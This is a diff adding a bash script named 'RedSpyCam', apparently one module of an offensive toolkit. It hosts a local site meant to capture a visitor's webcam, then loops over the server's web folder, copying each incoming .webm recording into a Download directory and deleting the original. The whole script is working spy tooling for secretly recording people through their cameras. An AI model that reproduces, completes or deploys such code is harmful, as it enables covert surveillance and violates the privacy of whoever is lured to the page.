@@ -1,0 +1,96 @@
+#!/bin/bash
+#RedSpyCam
+#Coded by Z3R07-RED
+
+
+REDSPYCAM="$tools_directory/RedSpyCam"
+
+kill_pid
+
+# BANNER SMALL
+function banner_small(){
+    if [[ -f "$banner_directory/banner01" ]]; then
+        echo -e "$R"
+        cat "$banner_directory/banner01" 2>/dev/null
+        sleep 0.2
+        echo -e "\n${G}[${W}-${G}]${C} Tool Created by $author (Club Secreto 07) ${W}"
+
+    fi
+    sleep 0.2
+}
+
+# CAPTURE VIDEOS
+function capture_video(){
+    _GCICONOI="$W"
+    _GCOLORRII="red"
+    _VWEBMNDS=""
+    let _VWEBMNN=0
+    let _LISTBFILESWN=0
+    echo -e "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for videos, ${BLUE}Ctrl + C ${ORANGE}to exit...${W}"
+    echo ""
+    while true; do
+        for gfwebm in $(ls -a "$LOCALSERVER/www/"); do
+            if [[ ! -d "Download" ]]; then
+                mkdir "Download" 2>/dev/null
+            fi
+
+            if [[ "$_GCOLORRII" == "red" ]]; then
+                _GCOLORRII="green"
+                _GCICONOI="$G"
+            else
+                _GCOLORRII="red"
+                _GCICONOI="$R"
+            fi
+
+            case "$gfwebm" in
+                *.webm)
+                    if [[ "$_VWEBMNN" != 0 ]]; then
+                        if [[ "$gfwebm" != "$_VWEBMNDS" ]]; then
+                            rm -rf "$LOCALSERVER/www/$_VWEBMNDS" 2>/dev/null
+                            let _VWEBMNN=$(($_VWEBMNN+1))
+                            cp "$LOCALSERVER/www/$gfwebm" "Download/" 2>/dev/null
+                        fi
+                    else
+                        if [[ "$_LISTBFILESWN" == 0 ]]; then
+                            rm -rf "$LOCALSERVER/www/$gfwebm" 2>/dev/null
+                        else
+                            let _VWEBMNN=$(($_VWEBMNN+1))
+                            cp "$LOCALSERVER/www/$gfwebm" "Download/" 2>/dev/null
+                        fi
+                    fi
+                    printf "\r${R}-$_GCICONOI[o]${R}-${W} ${G}[VIDEO]:${W} %02d   ${yellow}Download/ ..." "$_VWEBMNN"
+                    _VWEBMNDS="$gfwebm"
+                    sleep 0.4
+                    ;;
+                *)
+                    printf "\r${R}-$_GCICONOI[o]${R}-${W} ${G}[VIDEO]:${W} %02d   ${yellow}Download/ ..." "$_VWEBMNN"
+                    sleep 0.4
+                    ;;
+            esac
+        done
+        sleep 0.75
+        let _LISTBFILESWN=$(($_LISTBFILESWN+1))
+    done
+
+}
+
+
+
+$DIALOG --backtitle "$program_name - Red Spy Cam" \
+        --title "LOCAL SERVER" --clear \
+        --no-collapse --yesno "\nDo you want to start the local server to search for the webcam?" 10 60
+
+case $? in
+    0)
+        website="$REDSPYCAM"
+        setup_site
+        { sleep 1; clear; banner_small; }
+        echo -e "\n${red}[${white}-${red}]${green} Successfully Hosted at : ${green}${cyan}http://$HOST:$PORT ${green}"
+        capture_video
+        ;;
+    255)
+        echo $(clear); tput cnorm 2> /dev/null
+        echo "Program aborted." >&2
+        echo ""; exit 1
+        ;;
+esac
